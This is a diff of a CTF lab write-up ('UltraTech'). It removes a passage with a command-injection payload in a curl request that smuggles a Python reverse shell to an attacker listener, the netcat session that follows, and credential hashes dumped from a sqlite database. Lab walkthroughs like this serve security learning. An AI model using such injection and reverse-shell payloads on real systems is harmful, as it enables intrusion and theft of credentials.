@@ -1,35 +1,4 @@
 
-that's interesting
-we might get a reverse shell
-
-this is not working we might need a better shell
-```bash
-curl -G 'http://10.10.211.245:8081/ping' \
-  --data-urlencode $'ip=127.0.0.1`python - <<PY\nimport socket,os,pty\ns=socket.socket()\ns.connect(("10.23.99.212",4444))\nfor fd in (0,1,2): os.dup2(s.fileno(),fd)\npty.spawn("/bin/bash")\nPY`'
-```
-```bash
-nc -lvnp 4444
-Connection from 10.10.211.245:39338
-www@ip-10-10-211-245:~/api$ id
-id
-uid=1002(www) gid=1002(www) groups=1002(www)
-```
-
-```bash
-cat utech.db.sqlite 
-zz��etableusersusersCREATE TABLE users (
-            login Varchar,
-            password Varchar,
-            type Int
-���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84
-```
-
-Looks like we found some credentials:
-`r00t:f357a0c52799563c7c7b76c1e7543a32`
-`admin0d0ea5111e3c1def594c1684e3b9be84`
-
-
-
 # UltraTech CTF
 
 ## Recon
